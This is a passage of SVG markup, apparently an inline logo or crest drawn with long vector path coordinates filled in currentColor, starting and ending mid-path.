54.9067C65.4373 54.9067 64.849 55.3475 64.2115 56.0329C63.2328 57.1105 62.7914 58.4328 62.5468 59.3143L61.8122 62.498H60.0485L61.8607 54.9553H60.2446L60.2938 54.4168H63.7221ZM79.5417 60.5389C78.9049 61.7634 78.1702 62.5952 76.9457 62.645C75.9658 62.6935 75.8195 61.9104 75.7697 61.4204V61.1745L75.624 61.37C75.2312 61.9583 74.3011 62.7415 73.1251 62.7415C71.8034 62.7415 70.2359 61.4683 70.2359 59.4114C70.2359 56.5216 72.8319 54.1217 74.8396 54.1217C76.0642 54.1217 76.6027 54.5132 76.8971 55.0038L77.8758 50.8408H76.0642L76.2597 50.3017H79.7858L77.4842 59.6069C77.2887 60.5383 77.1412 61.0768 77.1412 61.4198C77.1412 61.713 77.2395 61.8114 77.4842 61.7628C77.8758 61.713 78.0227 61.4683 78.3172 61.1259C78.4143 60.979 78.8557 60.3428 78.954 60.1959L79.5417 60.5389ZM75.1826 54.6614C74.6441 54.6614 73.9095 54.9067 73.3212 55.886C72.294 57.6982 71.9995 58.9713 71.9995 60.2936C71.9995 61.4696 72.5866 62.0567 73.3212 62.0567C73.6642 62.0567 74.1056 61.9595 74.5458 61.5182C75.3302 60.8321 75.624 60.0496 76.1134 58.482C77.1412 55.396 75.9166 54.6614 75.1826 54.6614ZM83.7047 62.645C81.8433 62.645 80.3243 61.1266 80.3243 59.069C80.3243 56.3267 83.0187 54.1223 85.1247 54.1223C87.0833 54.1223 88.3564 55.8362 88.3564 57.5992C88.3564 58.5791 87.9648 59.6076 87.3279 60.4885C86.2509 62.0567 84.8309 62.645 83.7047 62.645ZM86.5454 56.3267C86.5454 55.3475 86.1538 54.6129 85.1739 54.6129C84.4393 54.6129 83.7053 55.0536 83.3125 55.6899C82.774 56.5714 82.0394 58.9221 82.0394 60.1959C82.0394 61.6159 82.8724 62.056 83.5578 62.056C84.0963 62.056 84.684 61.7628 85.0264 61.37C85.6134 60.6839 86.0063 59.4606 86.2509 58.3344C86.4464 57.5998 86.5454 56.963 86.5454 56.3267ZM93.0099 54.4168L92.5686 56.3759C93.2546 54.7106 94.6746 54.0737 95.85 54.0737C96.7801 54.0737 97.6616 54.3676 97.6616 55.5921C97.6616 55.9351 97.5645 56.2284 97.5147 56.5228L96.4863 60.6366C96.3406 61.3712 96.3406 61.1751 96.3406 61.3227C96.2422 61.7641 96.4863 61.7641 96.6824 61.7641C96.9768 61.7641 97.2221 61.5686 97.4182 61.3712C97.9082 60.7356 97.8584 60.8825 98.2499 60.1473L98.7399 60.4411C98.3969 61.2741 97.6137 62.7427 96.0467 62.7427C95.3607 62.7427 94.7238 62.2528 94.7238 61.3712C94.7238 61.1266 94.7736 60.9311 94.8222 60.6366L95.7523 56.3273C95.8506 56.0821 95.8992 55.8374 95.8992 55.6413C95.9976 55.1028 95.5076 54.9067 95.1646 54.9067C94.7232 54.9067 94.1361 55.3475 93.4986 56.0329C92.52 57.1105 92.0786 58.4328 91.8339 59.3143L91.0495 62.498H89.3363L91.1479 54.9553H89.4832L89.5318 54.4168H93.0099ZM16.8523 50.6454H17.2439L17.2931 50.2046H17.6847L17.1947 51.0369C17.1947 51.1347 17.3416 51.0861 17.44 51.0861L17.4892 51.0369V51.4285C17.0976 51.5754 16.6568 51.4285 16.6568 51.4285V51.0369C16.706 51.0861 16.9021 51.1347 16.9507 51.0369L16.4607 50.2046H16.8523V50.6454ZM8.52635 57.5021C8.62409 57.649 8.67327 57.7959 8.72183 57.9429C8.86875 58.2859 9.01568 58.5797 9.21178 58.9221L8.57553 59.4613C8.91856 59.902 9.31014 60.2936 9.65254 60.735C10.681 59.9998 11.7094 59.2166 12.8363 58.6289C13.3262 58.3842 14.0116 58.5797 14.5501 58.3351C14.1094 58.6781 13.8647 59.1674 13.4725 59.5104C13.7178 59.8043 13.8155 60.1965 14.0116 60.5395C13.5217 60.5395 12.9832 60.5881 12.5424 60.4411C12.6402 60.6858 12.6402 61.3227 12.6893 61.6171C12.2486 61.4217 11.7586 61.3227 11.367 60.9803C11.4156 61.6171 11.1709 62.1077 10.9748 62.6462C10.6324 62.3517 10.3386 62.0579 10.1425 61.7149C9.94639 62.1563 9.50624 62.4993 9.21178 62.9394L8.57553 63.8708C8.72245 63.4779 8.77164 62.9892 8.77164 62.5478C7.54708 62.3524 6.17623 61.7647 5.68566 60.4903C5.58987 60.2403 5.54009 59.9749 5.53874 59.7072C5.88114 60.3932 6.61575 60.7842 7.3018 60.8831C6.22417 60.2463 5.39182 59.1195 5.29346 57.8464C5.63648 58.5324 6.37109 59.2178 7.05651 59.5117V59.4625C5.93032 58.3855 5.24428 57.0626 5.39182 55.495C5.60197 56.46 6.18224 57.304 7.00796 57.8457C6.07725 56.6212 5.39182 55.1034 5.93095 53.4873C5.97951 55.1514 7.10632 56.6206 8.52635 57.5021ZM28.7044 57.8937C29.5859 57.3552 30.1244 56.4245 30.3697 55.5429C30.4675 57.1105 29.782 58.4328 28.6558 59.5098C29.3904 59.216 30.0765 58.5791 30.4189 57.8937C30.3697 58.726 29.9781 59.4613 29.3904 60.0975C29.0966 60.392 28.7536 60.6846 28.4112 60.8819C28.7339 60.8286 29.0473 60.7295 29.3419 60.5874C29.7046 60.3716 30.0076 60.0686 30.2234 59.7059C30.1742 60.7344 29.3911 61.7136 28.4604 62.1058C27.9704 62.3013 27.4811 62.4489 26.942 62.546C26.942 62.9874 26.9911 63.4761 27.1381 63.8689C26.7465 63.232 26.2559 62.5945 25.7666 62.0075C25.6844 61.9218 25.6182 61.822 25.5711 61.713C25.375 62.056 25.0812 62.3499 24.7388 62.6443C24.5433 62.1058 24.298 61.6159 24.3472 60.9784C23.9556 61.37 23.4657 61.4198 23.0249 61.6153C23.0249 61.2237 23.0249 60.8309 23.1718 60.4878C22.6333 60.5862 22.0948 60.5376 21.7026 60.5376C21.8495 60.1946 21.9964 59.8024 22.2411 59.5086C21.8003 59.1655 21.5557 58.6762 21.1635 58.3332C21.6042 58.5287 22.2903 58.4309 22.7802 58.5779C23.3199 58.8757 23.843 59.2026 24.3472 59.5571L25.6695 60.4872L26.0125 60.7331H26.0617L27.1393 59.4594L26.5516 58.9694C26.7963 58.5287 26.9924 58.0387 27.1393 57.5494C28.5593 56.6187 29.7347 55.1987 29.7839 53.4842C30.3205 55.1022 29.6351 56.6698 28.7044 57.8937Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M8.42874 57.1106C8.03716 56.9145 7.69414 56.5229 7.44885 56.1799C7.49803 55.2498 7.7427 54.4168 8.1349 53.5845C7.9388 54.8084 8.1349 56.033 8.42874 57.1106ZM28.2638 56.2284C28.0185 56.5715 27.6761 56.9145 27.2845 57.1106C27.5783 56.033 27.7744 54.8084 27.5783 53.633C27.9828 54.4418 28.2161 55.3254 28.2638 56.2284ZM9.31027 55.886C9.40801 55.5922 9.50638 55.2983 9.70248 55.0045C9.70248 55.3475 9.6533 55.7391 9.8494 56.033C10.3879 55.9352 11.0248 55.8369 11.6125 55.9352C11.3186 56.033 10.9756 56.2782 10.8287 56.5715C10.7795 56.5223 10.7795 56.4245 10.7309 56.376C10.584 56.376 10.4371 56.4252 10.2902 56.4252L10.7309 56.8659C10.6817 57.1112 10.6332 57.4536 10.7309 57.6983C10.7801 57.0614 11.1225 56.4737 11.6616 56.1799C11.9555 56.033 12.2985 55.9352 12.5923 56.1307C12.7386 56.2776 12.7878 56.4737 12.7386 56.6698C12.7386 56.5715 12.6409 56.4737 12.5432 56.4245C12.1024 56.2776 11.7594 56.62 11.5147 56.963C11.4655 57.0122 11.3678 57.11 11.3678 57.2083C11.5633 57.3552 11.8086 57.3061 12.0532 57.2569C12.2493 57.2083 12.3962 57.1592 12.5923 57.0122C12.2493 57.5016 11.7102 57.6977 11.2701 57.8938L11.4164 58.139C11.3186 58.2368 11.2209 58.3351 11.1225 58.3843L10.8287 57.9927C10.4863 58.2374 10.1432 58.4335 9.8494 58.6788L10.0941 59.0212C9.99632 59.1189 9.89858 59.2173 9.80022 59.2173C8.96787 58.1397 8.331 56.5721 8.96787 55.2012L9.16397 54.9074C9.16335 55.2498 9.16335 55.5922 9.31027 55.886ZM26.1085 58.9714L25.913 59.2167C25.8153 59.2167 25.7169 59.1183 25.6192 59.0698C25.6684 58.9228 25.8153 58.8245 25.8645 58.6782C25.5706 58.4329 25.2276 58.2374 24.8852 57.9921L24.5907 58.3837H24.5422C24.4444 58.2853 24.3461 58.2368 24.2483 58.1876C24.2975 58.0899 24.3953 57.9921 24.4444 57.8938C24.2483 57.796 24.0522 57.7468 23.8567 57.5999C23.5629 57.5022 23.2691 57.3061 23.1221 57.0129C23.416 57.2575 23.9053 57.3553 24.3461 57.2575C24.3461 57.1598 24.2483 57.1112 24.2483 57.0129C24.003 56.6698 23.6115 56.376 23.1707 56.4252C23.073 56.4252 23.0238 56.5229 22.9752 56.6206V56.6698C22.926 56.5715 22.926 56.3268 23.0244 56.2291C23.1713 56.0336 23.416 56.0336 23.6606 56.0821C24.1998 56.1799 24.7383 56.6698 24.8852 57.209C24.9338 57.3559 24.9338 57.552 24.9829 57.7475C25.0807 57.4536 25.0315 57.0614 24.9829 56.8659C25.1299 56.719 25.2768 56.5721 25.4237 56.4743C25.2768 56.4252 25.1299 56.4252 24.9829 56.3766C24.9829 56.4258 24.9338 56.5235 24.8852 56.5721C24.7383 56.3274 24.4444 56.0336 24.1014 55.9844C24.6399 55.8375 25.3253 55.9352 25.8645 56.0821C26.0599 55.7883 26.0114 55.3961 25.9622 55.0537C26.2075 55.2983 26.3052 55.5922 26.403 55.9352C26.5499 55.5922 26.5984 55.2983 26.5499 54.9068C27.4308 56.1799 26.8923 57.8938 26.1085 58.9714Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M17.1463 47.8058H17.6362V47.4136H18.077V47.8058H18.5177V47.4136H18.9585V48.932L18.6647 49.1772V50.2549H19.497C19.5462 50.1565 19.6439 50.0588 19.7915 50.108H20.6238C20.5746 50.3532 20.4769 50.6465 20.2322 50.794C20.1653 50.8552 20.0783 50.89 19.9876 50.8917C20.183 51.0387 20.2322 51.2833 20.183 51.528C20.1339 51.6264 20.0853 51.7241 19.9876 51.7733C20.183 52.0671 20.2322 52.4593 19.9876 52.7525C20.4283 52.9978 19.9876 53.3402 20.0368 53.6833C20.1837 53.781 20.3306 53.8787 20.3798 54.0748C20.3798 54.2709 20.3306 54.4664 20.1837 54.5648C20.1345 54.614 20.0367 54.614 19.9882 54.614C19.9882 54.7609 20.1351 54.9078 20.282 55.0055C20.5759 55.201 21.0658 55.1525 21.4088 55.0055C21.5558 54.9078 21.7519 54.7117 21.8004 54.5156C21.8496 54.4179 21.8004 54.3201 21.7512 54.2218C21.6043 54.0257 21.3597 53.9765 21.1636 54.0257C21.0043 54.078 20.8667 54.1812 20.772 54.3195C20.6251 53.781 20.6742 53.0949 21.1636 52.7519C21.4088 52.6542 21.7512 52.6542 21.9965 52.8011C22.0457 52.8011 22.0943 52.8995 22.192 52.948C22.1428 52.1642 22.2412 51.3319 22.9758 50.8911C23.4166 50.6458 24.0528 50.695 24.4936 50.9889L24.788 51.2341C25.0564 51.2565 25.3254 51.1986 25.5608 51.0678C25.7963 50.937 25.9875 50.7392 26.1103 50.4995C26.2087 50.4012 26.2573 50.2057 26.2573 50.0588C26.5403 50.2673 26.753 50.5572 26.8668 50.8899C26.9806 51.2225 26.9901 51.582 26.8941 51.9202C26.8449 51.9688 26.8941 52.0179 26.9433 52.0665C27.4824 52.1649 27.874 51.8218 28.2656 51.4788C28.3148 52.3112 28.0203 53.1441 27.2371 53.5357C26.7964 53.7312 26.2087 53.6334 25.8171 53.3402C25.4255 53.0464 25.1802 52.6542 24.9848 52.2626C24.8378 52.0665 24.544 52.1157 24.2502 52.1649C23.8586 52.214 23.4664 52.5079 23.2703 52.8509C23.2217 52.9978 23.1725 53.0956 23.1725 53.2425C23.2217 53.2425 23.3194 53.1933 23.3686 53.1441C23.7117 52.9972 24.1524 53.0949 24.3971 53.3402C24.6424 53.5855 24.6909 53.9765 24.5926 54.2709C24.4948 54.614 24.1518 54.9564 23.858 55.0547C23.8088 54.7117 23.6127 54.5648 23.4172 54.5648C22.9272 54.4664 22.7311 54.9564 22.3887 55.201C22.0457 55.544 21.458 55.7887 21.5066 56.3278C21.5066 56.5725 21.6535 56.8178 21.8496 56.9641C21.9474 57.0133 22.0457 57.0618 22.1435 57.0618C21.5066 57.3071 20.6251 57.3557 20.0866 56.8663C19.9396 57.0618 20.1357 57.454 20.1843 57.5026C20.3312 57.7964 20.5273 58.0417 20.5273 58.3847C20.2335 58.0909 19.8911 57.9931 19.4503 58.0909C19.4503 58.0909 19.205 58.0909 18.0788 58.7769C17.785 58.9724 17.5403 59.0708 17.5403 59.0708C17.5403 59.0708 17.4426 59.0216 17.3934 59.0216C17.0504 58.7769 16.6588 58.5808 16.3158 58.4339C16.1894 58.3022 16.1192 58.1265 16.1203 57.944C16.1431 57.8489 16.1917 57.762 16.2608 57.6929C16.33 57.6238 16.4168 57.5752 16.5119 57.5524V57.454L16.2672 57.0624C16.0858 57.02 15.906 56.971 15.7281 56.9155C15.0912 57.2094 14.2097 57.3071 13.5243 57.0624C13.7689 57.0139 14.0142 56.867 14.112 56.6217C14.2097 56.377 14.2097 56.034 14.0142 55.8379C13.6712 55.4463 13.2304 55.2016 12.9372 54.7609C12.7411 54.614 12.4473 54.5156 12.2026 54.5654C12.1047 54.6059 12.0204 54.6736 11.9597 54.7604C11.8989 54.8472 11.8642 54.9495 11.8596 55.0553C11.468 54.9084 11.0758 54.4185 11.0758 53.9777C11.0758 53.6347 11.2227 53.39 11.468 53.1939C11.8104 53.047 12.2518 53.047 12.4964 53.2431C12.4964 52.9001 12.301 52.6062 12.0557 52.4101C11.7126 52.1655 11.1741 52.0186 10.7826 52.2147C10.4887 52.6554 10.2441 53.0962 9.80329 53.39C9.41109 53.6347 8.82402 53.6839 8.38264 53.4392C7.69721 53.0476 7.40337 52.2638 7.45192 51.4801C7.69721 51.6762 7.99043 51.9208 8.28427 52.0192C8.43119 52.0677 8.72504 52.1169 8.87196 51.97C8.77422 51.8231 8.72504 51.5292 8.72504 51.4315C8.77422 50.893 9.01888 50.3545 9.45964 50.0115C9.45964 50.5014 9.90041 50.9907 10.3412 51.1377C10.5373 51.1868 10.7328 51.236 10.9289 51.236C11.3204 50.8444 11.8104 50.6483 12.3489 50.7461C12.7897 50.8444 13.2304 51.236 13.3773 51.6282C13.5243 52.0198 13.5243 52.5097 13.5243 52.9505C13.7197 52.7052 14.0142 52.6075 14.3566 52.7052C14.6996 52.7544 14.8951 53.146 14.9443 53.4398C14.9935 53.7337 14.9935 54.0761 14.9443 54.3214C14.7974 54.1253 14.6019 53.9783 14.3074 54.0275C14.1605 54.0275 14.0136 54.0767 13.9158 54.2236C13.8175 54.3705 13.8667 54.6152 13.965 54.7621C14.3074 55.2029 14.9443 55.2521 15.4342 55.1537C15.5812 55.1045 15.6795 55.056 15.8258 55.0068C15.7281 55.1537 15.7281 55.3984 15.875 55.5453C16.365 56.0352 17.1973 55.9861 17.8335 55.8391C18.3265 55.6941 18.8027 55.4974 19.2542 55.2521C18.9112 55.6928 19.3526 56.1822 19.4503 56.6229C19.5966 56.3783 19.7933 56.133 19.8911 55.8391C19.9396 56.3291 20.2335 56.7698 20.7234 56.9168C20.9189 56.9659 21.1642 56.9659 21.4088 56.9168C21.2134 56.6721 21.115 56.3783 21.2134 56.0844C21.2619 55.6928 21.6541 55.4967 21.7033 55.1537C21.3117 55.3984 20.724 55.4961 20.2827 55.3006C19.9888 55.2029 19.7442 54.909 19.5966 54.6152C18.8134 55.2521 17.8335 55.5945 16.7074 55.4967C16.8051 55.2521 16.9526 55.056 17.0504 54.8113H16.6588L16.3158 55.4482C16.1819 55.3702 16.0784 55.2494 16.0219 55.1051C16.0219 54.9582 16.0705 54.7621 16.1682 54.6644C16.1197 54.6152 16.0219 54.6152 15.9727 54.6152C15.8689 54.5833 15.7744 54.5265 15.6975 54.4497C15.6207 54.3728 15.5638 54.2783 15.532 54.1744C15.532 53.9298 15.6789 53.6851 15.9242 53.6851C15.9242 53.5874 15.875 53.3913 15.9242 53.2935C15.9493 53.2224 15.9957 53.1607 16.0571 53.1169C16.1184 53.073 16.1918 53.049 16.2672 53.0483C16.2672 53.0483 16.2672 52.9991 16.3158 52.9991V52.656L15.7281 52.5091L15.1404 50.9907C15.1404 50.9907 15.5812 50.6969 15.7773 50.55C15.6303 50.4522 15.8265 50.3545 15.8265 50.2069L16.0711 49.9131C16.0226 49.6678 16.0711 49.4232 15.9734 49.2271C16.2187 49.3248 16.4141 49.5209 16.6594 49.5209L17.0024 49.4717V49.1779L16.7572 48.9326V47.4136H17.1487V47.8058H17.1463ZM17.8317 48.5398C17.4893 48.6867 17.5378 49.0297 17.5378 49.3721H18.1255C18.1255 49.1766 18.1741 49.0291 18.1255 48.8336C18.077 48.7359 17.9786 48.5398 17.8317 48.5398ZM16.2647 49.6666L16.3133 50.0096C16.2155 50.1565 16.068 50.2549 16.068 50.4504L16.3133 50.7934C16.3133 50.9403 16.2155 51.0872 16.1664 51.2341L16.4608 51.8218H16.7547L17.0485 52.1649L17.3424 51.8218H17.587L17.93 51.2341C17.8317 51.0872 17.7339 50.9403 17.7339 50.7934L18.0284 50.4504C17.9792 50.2549 17.8815 50.1565 17.7831 50.0096V49.6666L17.4893 49.8135C17.1867 49.7158 16.8611 49.7158 16.5586 49.8135L16.2647 49.6666ZM19.7417 50.352C19.6931 50.4006 19.6439 50.4497 19.5462 50.4989C19.3009 50.5481 18.9093 50.4497 18.6647 50.5481C18.5663 50.5973 18.5177 50.695 18.4685 50.7934C18.4685 50.8911 18.4194 51.038 18.5177 51.0872C18.7138 51.3811 19.1546 51.2833 19.4484 51.2833L19.5462 51.3811C19.5462 51.4302 19.497 51.4788 19.4484 51.4788H18.077C17.9792 51.6749 17.8317 51.8218 17.8317 52.0665H17.4401L17.0485 52.5564L16.6569 52.0665H16.2162V51.9202L15.8731 51.2341C15.9277 51.1058 15.9767 50.9751 16.0201 50.8426L15.9223 50.7442L15.4816 51.0872L15.9223 52.3118L16.3139 52.4095V52.3118H16.5592L16.51 53.1441C16.51 53.291 16.3637 53.1933 16.2653 53.2425C16.1184 53.3402 16.2162 53.5855 16.167 53.6833C16.2718 53.6073 16.3939 53.5586 16.5223 53.5416C16.6506 53.5245 16.7812 53.5396 16.9022 53.5855L17.1961 52.7525C17.7837 52.8017 18.4206 52.6548 18.8614 52.214C19.0083 52.5079 19.2044 52.7525 19.4491 52.9978V53.1447C19.4491 53.2917 19.3021 53.1447 19.2038 53.2431C19.106 53.2431 19.106 53.4386 19.106 53.537L19.3015 53.6839C19.4484 53.5861 19.6445 53.5861 19.7915 53.5861L19.9378 52.9984L19.6931 52.7046C19.7908 52.6554 19.8394 52.5577 19.8886 52.4599C19.9371 52.2147 19.8886 51.97 19.6931 51.7739C19.8886 51.6762 19.9378 51.5286 19.9378 51.3331C19.8892 50.8432 19.3015 51.0393 18.9585 50.9901C18.763 50.9901 18.763 50.7448 18.9585 50.7448C19.3015 50.7448 19.7423 50.794 20.0361 50.6471C20.183 50.5979 20.2808 50.4516 20.2808 50.3532H19.7417V50.352ZM9.31023 50.5967L9.26167 50.6458C8.96783 51.0866 8.96783 51.7235 9.26167 52.1642C9.16393 52.2134 9.11475 52.262 9.01639 52.3112C8.62481 52.4581 8.13486 52.3603 7.79184 52.1157C7.88958 52.5073 8.13486 52.948 8.52644 53.1927C8.86947 53.3396 9.26105 53.3396 9.55489 53.1435C10.2409 52.7519 10.3387 52.0659 10.7303 51.5274C10.1426 51.5274 9.55489 51.1358 9.31023 50.5967ZM26.3538 50.5967C26.1576 51.1843 25.57 51.5274 24.9823 51.5274C25.3247 52.0173 25.423 52.605 25.9615 53.0458C26.2554 53.2419 26.5978 53.3888 26.99 53.2419C27.4799 53.0949 27.8223 52.605 27.9207 52.1151C27.7738 52.2128 27.5783 52.3105 27.3822 52.3597C27.0392 52.4089 26.6962 52.3597 26.4515 52.1642C26.5007 52.1151 26.5007 52.0659 26.5499 52.0173C26.7453 51.5765 26.6962 50.9889 26.3538 50.5967ZM18.7624 52.5558L18.4194 52.8005C18.4194 52.8988 18.5171 52.9474 18.5663 52.9966C18.5663 53.0458 18.5663 53.1921 18.5171 53.1921C18.4679 53.2412 18.3216 53.1921 18.2724 53.2412C18.1741 53.2412 18.1255 53.339 18.1255 53.4367C18.2724 53.4367 18.4194 53.4367 18.5171 53.5836C18.6155 53.5345 18.7132 53.4367 18.8601 53.4853C18.8601 53.3384 18.8601 53.2406 18.9579 53.0937C18.9579 53.0445 19.0562 52.996 19.1048 52.996C18.9755 52.8617 18.8608 52.7141 18.7624 52.5558ZM18.2731 53.6826C18.1747 53.6334 17.9792 53.6334 17.8815 53.7312C18.1268 53.8781 18.1753 54.2211 18.4692 54.2703C18.5669 54.3195 18.6653 54.2703 18.7145 54.2211C18.5663 54.0742 18.4685 53.8289 18.2731 53.6826ZM17.4893 53.6826C17.3424 53.6334 17.244 53.6826 17.1463 53.7804L17.5378 54.1719C17.6848 54.2703 17.8809 54.3189 18.0278 54.2211C17.8317 54.025 17.6854 53.7804 17.4893 53.6826ZM18.6647 53.7312C18.8116 53.9273 18.9093 54.1228 19.1054 54.3189C19.1593 54.3432 19.2178 54.3558 19.2769 54.3558C19.3361 54.3558 19.3945 54.3432 19.4484 54.3189C19.3015 54.1228 19.2032 53.9273 19.0569 53.7804C18.9585 53.6826 18.7624 53.6826 18.6647 53.7312ZM16.8032 53.7804C16.6563 53.7312 16.5094 53.7312 16.4116 53.8289C16.6077 53.9758 16.7547 54.1719 16.9508 54.3189C17.0485 54.3681 17.2446 54.3189 17.3424 54.2697C17.1463 54.0742 16.9993 53.8781 16.8032 53.7804ZM19.3993 53.8781C19.5462 54.025 19.6445 54.2697 19.84 54.3681C19.9378 54.4172 20.0361 54.4172 20.0853 54.3189C20.1345 54.2697 20.1345 54.172 20.1345 54.0736C19.9869 53.8289 19.6439 53.7804 19.3993 53.8781ZM16.1178 53.9273C16.0686 53.8781 15.9709 53.9273 15.8725 53.9273C15.8233 53.9765 15.8233 54.0742 15.8233 54.1719C15.8725 54.2703 15.9217 54.3681 16.0194 54.3681C16.2149 54.4172 16.4602 54.4172 16.6071 54.3189C16.4608 54.1719 16.3139 53.9765 16.1178 53.9273ZM14.0117 55.2004C14.3547 55.6412 14.648 56.1797 14.4033 56.7188C14.3547 56.8165 14.3056 56.8657 14.257 56.9143C14.7955 56.9635 15.2363 56.8651 15.6285 56.6204C15.8731 56.7188 16.167 56.7673 16.4608 56.7673C16.7547 57.355 17.0485 57.8935 17.244 58.5304C17.2932 58.0896 17.244 57.5997 17.1463 57.1589C17.0971 57.0126 17.0485 56.8651 16.9993 56.7673C17.3909 56.7182 17.7831 56.5712 18.1261 56.4243C18.3708 56.2774 18.6647 56.1305 18.8608 55.8366C18.2245 56.2282 17.4893 56.4243 16.6569 56.4735C16.167 56.4735 15.6285 56.4735 15.3838 55.9836C15.2861 55.7875 15.433 55.5428 15.4816 55.3959C14.9916 55.5434 14.4033 55.4457 14.0117 55.2004ZM12.4448 58.4333L11.0733 59.364L9.751 60.2941H9.70244L9.01639 59.4617C9.11413 59.364 9.26167 59.2656 9.35941 59.1679L9.751 59.6087C9.99628 59.4617 10.2409 59.2656 10.4862 59.0702C10.437 58.9724 10.2901 58.8249 10.2409 58.7271L10.7309 58.3356L11.0247 58.7271C11.27 58.5317 11.5632 58.3847 11.8079 58.2372L11.7102 58.0417C11.8571 57.9433 12.004 57.8456 12.2001 57.7964L12.4448 58.4333ZM24.003 58.0411L23.9053 58.2366L24.6891 58.7265C24.7874 58.6288 24.8852 58.4818 24.9829 58.3841L25.4728 58.7265L25.2276 59.0695L25.9622 59.6572C26.1091 59.5103 26.2075 59.3634 26.3538 59.2165C26.4515 59.265 26.5984 59.3634 26.6962 59.4611V59.5103L25.9615 60.2935L24.1985 59.0695L23.2678 58.4818L23.5131 57.7958C23.7092 57.8456 23.8561 57.9433 24.003 58.0411ZM15.1871 60.9795L15.7748 60.0494L16.3631 60.9795H15.1871ZM20.4769 60.9795H19.3507C19.5116 60.6591 19.6914 60.3485 19.8892 60.0494C20.0847 60.3439 20.2808 60.6857 20.4769 60.9795ZM16.0686 62.9885C15.9709 63.184 15.9223 63.4772 15.8731 63.7716C15.9709 63.8202 16.1184 63.7716 16.2162 63.7231H16.2653V64.0163C16.167 63.9677 16.0692 63.9677 15.9223 63.9677C15.9223 64.1147 15.9709 64.2622 15.9223 64.4577H15.6285C15.6285 64.2622 15.6285 64.1147 15.6777 63.9677C15.5307 63.9677 15.3838 63.9677 15.2861 64.0163V63.7231C15.3838 63.7716 15.5307 63.8202 15.6777 63.7716C15.6777 63.4772 15.5799 63.2331 15.4816 62.9885C15.5799 62.8415 15.7268 62.6454 15.7754 62.4985C15.824 62.6454 15.9709 62.8409 16.0686 62.9885Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M20.5254 58.7267H21.1131C21.3086 59.0205 21.5539 59.3143 21.7985 59.5104C21.5047 59.9512 21.3578 60.4897 21.0154 60.9311H21.5539C21.6024 61.421 21.6516 61.911 21.8963 62.3026H18.664V64.6527H21.6516C21.5047 66.8073 19.8394 68.9134 17.831 69.6978C15.8233 68.9134 14.2072 66.8073 14.0603 64.6527H16.9987V62.3026H13.815C14.0603 61.911 14.1088 61.421 14.1088 60.9311H14.6473V60.8825C14.3043 60.4897 14.2066 60.0004 13.9127 59.5596C13.9127 59.5596 13.8635 59.5104 13.9127 59.5104C14.1509 59.2715 14.3641 59.0089 14.549 58.7267H16.2635C16.7042 58.9221 17.0958 59.1182 17.4874 59.4127C18.0751 59.1189 18.6142 58.7765 19.2013 58.4334C19.4951 58.3357 19.8873 58.2373 20.1805 58.4334C20.2808 58.5306 20.4277 58.6283 20.5254 58.7267ZM20.7215 59.7551H14.991V59.9506H15.5787L14.8926 61.078C14.9418 61.2249 15.0395 61.421 15.1864 61.5182C15.4317 61.7136 15.7741 61.7641 16.068 61.6651C16.3133 61.568 16.5579 61.3706 16.6557 61.078L16.0194 59.9506H17.4886V60.392H17.7825L17.3909 60.8819L17.8317 61.3221L18.2724 60.8819L17.8808 60.392H18.1747L18.2239 59.9506H19.6931C19.6931 59.9506 19.2523 60.735 19.007 61.078C19.0562 61.1751 19.1539 61.3227 19.2025 61.421C19.4478 61.7143 19.8388 61.7641 20.1818 61.6657C20.4271 61.6171 20.7209 61.3227 20.7695 61.0786L20.0834 59.9512H20.7203V59.7551H20.7215ZM16.9993 65.9756H14.6977C15.0401 67.1018 15.9223 68.2274 16.9993 68.9134V65.9756ZM18.6646 65.9756V68.9134C19.3507 68.4733 19.9377 67.885 20.4277 67.2002C20.673 66.8073 20.8684 66.4157 21.0154 65.9756H18.6646ZM26.2554 68.6202C26.2068 68.9775 26.2068 69.3398 26.2554 69.6972H26.0107C26.1084 69.4513 26.0599 69.1089 26.0599 68.8157C25.9621 69.0603 25.913 69.3056 25.8644 69.5503H25.6677C25.6677 69.3056 25.6185 69.1089 25.5208 68.9134V69.6493L25.5699 69.6978C25.4722 69.7464 25.3738 69.7464 25.3247 69.7464L25.3738 69.6493C25.3738 69.3548 25.3738 69.0124 25.3247 68.7179C25.423 68.6694 25.5208 68.6694 25.6677 68.6694C25.6677 68.8163 25.7654 69.0124 25.7654 69.1593C25.8146 69.0124 25.9123 68.8163 25.9123 68.6208H26.2554V68.6202ZM10.6325 68.8642V69.6972L10.6817 69.7943C10.5839 69.7943 10.4862 69.7458 10.3878 69.7458L10.437 69.6486C10.437 69.3056 10.4862 68.9626 10.3878 68.6687L10.6817 68.7173L10.6325 68.8642ZM25.0806 68.8642C25.0314 69.2072 25.1784 69.6486 24.8851 69.8441C24.7382 69.8927 24.5907 69.9412 24.4929 69.8441L24.4444 69.7458V69.0111L24.3952 68.9626C24.4444 68.9128 24.5907 68.8642 24.689 68.8642L24.5907 68.9626L24.6398 69.6972C24.7376 69.8441 24.8353 69.6972 24.8851 69.6486V68.9128L24.836 68.8157C24.9337 68.7671 25.0314 68.7671 25.1298 68.7173L25.0806 68.8642ZM10.1426 68.8157C10.2403 69.0603 10.2403 69.3056 10.0934 69.5017C9.94645 69.7464 9.65261 69.6972 9.35876 69.6972C9.55425 69.4513 9.4565 69.0603 9.4565 68.7173C9.4565 68.6687 9.40732 68.6687 9.40732 68.6202C9.70179 68.6202 9.99563 68.5704 10.1426 68.8157ZM9.70179 68.7671L9.65261 69.5503C9.75035 69.5503 9.84871 69.5503 9.89789 69.4519C9.99563 69.3062 9.99563 69.0603 9.94707 68.8648C9.89789 68.7671 9.80015 68.7671 9.70179 68.7671ZM11.514 68.9626V69.2073C11.4157 69.1587 11.3671 69.0118 11.2202 69.0603C11.0247 69.2073 11.0733 69.4034 11.1224 69.5988C11.1224 69.6972 11.1716 69.7943 11.2694 69.8447C11.3671 69.8447 11.4157 69.8447 11.514 69.7949V70.0408C11.2694 70.0408 11.0733 69.9923 10.9263 69.7464C10.828 69.5509 10.828 69.2079 10.9749 69.0603C11.0726 68.9134 11.2202 68.8648 11.3671 68.9134C11.4157 68.9128 11.4655 68.9626 11.514 68.9626ZM24.2968 69.1587V69.2073C24.1991 69.1587 24.1499 69.1587 24.0515 69.2073L24.0024 69.2558C24.0515 69.5017 24.0024 69.8441 24.1007 70.0888L23.8069 70.2357C23.9046 69.9412 23.8069 69.5988 23.8561 69.3056C23.7583 69.3056 23.66 69.4513 23.6108 69.5503C23.5616 69.4519 